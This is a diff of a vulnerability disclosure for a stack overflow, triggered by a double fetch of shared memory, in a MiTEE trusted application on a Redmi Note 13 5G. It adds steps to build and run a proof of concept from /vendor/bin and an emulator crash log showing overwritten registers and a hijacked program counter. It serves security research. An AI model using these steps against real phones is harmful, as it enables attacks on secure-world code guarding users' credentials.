@@ -1,5 +1,6 @@
 
-In short, this is a stack-overflow bug of TA (UUID: 377ee4e8-af0e-474f-a9d636a9268fe85c) of MiTEE, triggered by double fetches.
+In short, this is a stack-overflow bug of TA (UUID: 377ee4e8-af0e-474f-a9d636a9268fe85c) of MiTEE, triggered by a double fetch issue of shared memory.
+
 
 ## Device Information
 
@@ -9,7 +10,7 @@ The sha1 of the TA is `3184df814c4b0dfe363141572f384be85c226a53`
 
 ## Detailed Vulnerability Analysis
 
-The key reason for this vulnerability is the double-fetch problem to the allocated memory between normal world and security world.
+The key reason for this vulnerability is the double-fetch problem to the allocated memory between normal world and security world. An attacker can easily manipulate this shared memory from normal world to influence the behavior of the TA in secure world.
 
 The entry point of this bug is the function `TA_InvokeCommandEntryPoint` with command id 0x100b. 
 
@@ -114,91 +115,7 @@ Specifically, prior to the first fetch, the attacker supplies a short buffer to 
 ```
 
 
-## Screenshots for Validity
-
-#TODO
-
-
-More detailed can be seen in our customized emulation mode.
-
-```bash
-[=]     printf: [SoterApp:INFO][TA_CreateEntryPoint:15]==func enter==
-[=]     printf: [SoterApp:INFO][TA_OpenSessionEntryPoint:28]==func enter==
-[=]     printf: [SoterApp:INFO][TA_InvokeCommandEntryPoint:174]==func enter==
-[=]     printf: [SoterApp:INFO][has_auth_already:870]==func enter==
-[=]     printf: [SoterApp:INFO][has_auth_already:877]uid=4, name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-[+]     TEE_OpenPersistentObject:
-[+]             objectID b'4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-[+]             file name: ./emulator/files/2147483648/4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-[+]             ret 0xffff0008
-[=]     printf: [SoterApp:ERROR][is_file_exists:35]Open file 4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA fail, err: 0xffff0008
-
-[=]     printf: [SoterApp:ERROR][has_auth_already:885]4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA not exist
-
-[x]     stack_chk_fail ***stack smashing detected***
-[x]     =================[lr: 0x555555576ed0] [__stack_chk_fail] memory corruption detected!!
-[x]     CPU Context:
-[x]     x0      : 0xfffffffa
-[x]     x1      : 0x55555555a41e
-[x]     x2      : 0x555555559757
-[x]     x3      : 0x555555555b34
-[x]     x4      : 0x375
-[x]     x5      : 0xf0ff48
-[x]     x6      : 0xffff0008
-[x]     x7      : 0x0
-[x]     x8      : 0x4141414141414141
-[x]     x9      : 0xcacacacacacacaca
-[x]     x10     : 0x5555555744ec
-[x]     x11     : 0x84
-[x]     x12     : 0x0
-[x]     x13     : 0x0
-[x]     x14     : 0x0
-[x]     x15     : 0x0
-[x]     x16     : 0x5555555b92c8
-[x]     x17     : 0x99999008
-[x]     x18     : 0x0
-[x]     x19     : 0xf0ff48
-[x]     x20     : 0xf0ff30
-[x]     x21     : 0x4
-[x]     x22     : 0xf0ffc8
-[x]     x23     : 0x55555555719c
-[x]     x24     : 0x555555555b34
-[x]     x25     : 0xf0ff38
-[x]     x26     : 0xf0ff48
-[x]     x27     : 0xeee008
-[x]     x28     : 0xf0ffd0
-[x]     x29     : 0x8000002dddb0
-[x]     x30     : 0x555555576ed0
-[x]     sp      : 0x8000002ddd50
-[x]     pc      : 0xdeadbeef
-[x]     lr      : 0x555555576ed0
-[x]     cpacr_el1       : 0x300000
-[x]     pstate  : 0xa00003c5
-[x]     b0      : 0x0
-[x]     ...
-[x]     PC = 0x00000000deadbeef (unreachable)
-
-[x]     Memory map:
-[x]     Start            End              Perm    Label                                    Image
-[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
-[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
-[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
-[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
-[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
-[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
-[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_1
-[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
-[x]     00555555554000 - 00555555574000   r--     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
-[x]     00555555574000 - 005555555b6000   r-x     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
-[x]     005555555b6000 - 005555555c5000   rw-     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
-[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
-[x]     007ffffffde000 - 008000002de000   rwx     [stack]
-```
-
-### Source code of the POC
+## Source code of the POC
 
 
 
@@ -399,10 +316,118 @@ For reference, the dependent files for the PoC are attached here.
 
 
 
-### Vulnerability Reproduction
+## Vulnerability Reproduction
 
-1. preacquisition
-2. interaction
-3. clip
 
-#TODO
+We reproduced the poc on the Redmi Note 13 5G (OS Version: 1.0.18.0.UNQEUXM)
+
+
+1. Compile and run the poc:
+```
+ANDROID_NDK=$(path to android ndk) make 
+```
+
+Upload the generate `./poc` executable to `/vendor/bin`. (On the phone we used a magisk plugin for this, but on a developer phone it should be possible to make `/vendor` writable)
+
+2. Afterwards run the poc: 
+   
+```
+/vendor/bin/poc
+```
+
+The poc triggers the stack overflow, which causes the TA to crash in the canary check.
+The poc prints the return code and error origin which will be, indicating the TA crashed.
+
+```
+TEEC_Result: ffff3024  // TEE_ERROR_TARGET_DEAD
+origin: err_origin: 3 // TEEC_ORIGIN_TEE
+```
+
+
+### Screenshots for Validity
+
+![](pics/image.png)
+
+
+More detailed can be seen in our customized emulation mode.
+
+```bash
+[=]     printf: [SoterApp:INFO][TA_CreateEntryPoint:15]==func enter==
+[=]     printf: [SoterApp:INFO][TA_OpenSessionEntryPoint:28]==func enter==
+[=]     printf: [SoterApp:INFO][TA_InvokeCommandEntryPoint:174]==func enter==
+[=]     printf: [SoterApp:INFO][has_auth_already:870]==func enter==
+[=]     printf: [SoterApp:INFO][has_auth_already:877]uid=4, name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[+]     TEE_OpenPersistentObject:
+[+]             objectID b'4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[+]             file name: ./emulator/files/2147483648/4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[+]             ret 0xffff0008
+[=]     printf: [SoterApp:ERROR][is_file_exists:35]Open file 4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA fail, err: 0xffff0008
+
+[=]     printf: [SoterApp:ERROR][has_auth_already:885]4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA not exist
+
+[x]     stack_chk_fail ***stack smashing detected***
+[x]     =================[lr: 0x555555576ed0] [__stack_chk_fail] memory corruption detected!!
+[x]     CPU Context:
+[x]     x0      : 0xfffffffa
+[x]     x1      : 0x55555555a41e
+[x]     x2      : 0x555555559757
+[x]     x3      : 0x555555555b34
+[x]     x4      : 0x375
+[x]     x5      : 0xf0ff48
+[x]     x6      : 0xffff0008
+[x]     x7      : 0x0
+[x]     x8      : 0x4141414141414141
+[x]     x9      : 0xcacacacacacacaca
+[x]     x10     : 0x5555555744ec
+[x]     x11     : 0x84
+[x]     x12     : 0x0
+[x]     x13     : 0x0
+[x]     x14     : 0x0
+[x]     x15     : 0x0
+[x]     x16     : 0x5555555b92c8
+[x]     x17     : 0x99999008
+[x]     x18     : 0x0
+[x]     x19     : 0xf0ff48
+[x]     x20     : 0xf0ff30
+[x]     x21     : 0x4
+[x]     x22     : 0xf0ffc8
+[x]     x23     : 0x55555555719c
+[x]     x24     : 0x555555555b34
+[x]     x25     : 0xf0ff38
+[x]     x26     : 0xf0ff48
+[x]     x27     : 0xeee008
+[x]     x28     : 0xf0ffd0
+[x]     x29     : 0x8000002dddb0
+[x]     x30     : 0x555555576ed0
+[x]     sp      : 0x8000002ddd50
+[x]     pc      : 0xdeadbeef
+[x]     lr      : 0x555555576ed0
+[x]     cpacr_el1       : 0x300000
+[x]     pstate  : 0xa00003c5
+[x]     b0      : 0x0
+[x]     ...
+[x]     PC = 0x00000000deadbeef (unreachable)
+
+[x]     Memory map:
+[x]     Start            End              Perm    Label                                    Image
+[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
+[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
+[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
+[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
+[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
+[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
+[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_1
+[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
+[x]     00555555554000 - 00555555574000   r--     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
+[x]     00555555574000 - 005555555b6000   r-x     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
+[x]     005555555b6000 - 005555555c5000   rw-     377ee4e8-af0e-474f-a9d636a9268fe85c.ta   /srv/emulator/rootfs/377ee4e8-af0e-474f-a9d636a9268fe85c.ta
+[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
+[x]     007ffffffde000 - 008000002de000   rwx     [stack]
+```
+
+### Impact 
+
+An attacker running in the normal world (either as root or in the context of a process able to communicate with the tee drivers like `/dev/tee0` or `/dev/teepriv0`) can trigger this bug. 
